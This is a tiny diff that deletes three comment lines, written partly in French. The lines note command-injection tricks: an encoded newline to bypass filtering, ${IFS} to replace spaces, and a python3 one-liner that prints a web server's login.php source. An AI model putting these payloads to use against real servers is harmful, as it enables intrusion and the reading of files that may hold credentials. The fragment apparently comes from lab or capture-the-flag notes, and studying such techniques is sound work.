@@ -1,3 +1,0 @@
-//%0a pour bypass 
-//${IFS} pour les espaces ! 
-//python3${IFS}-c${IFS}"print(open('/var/www/html/php/login.php').readlines())"
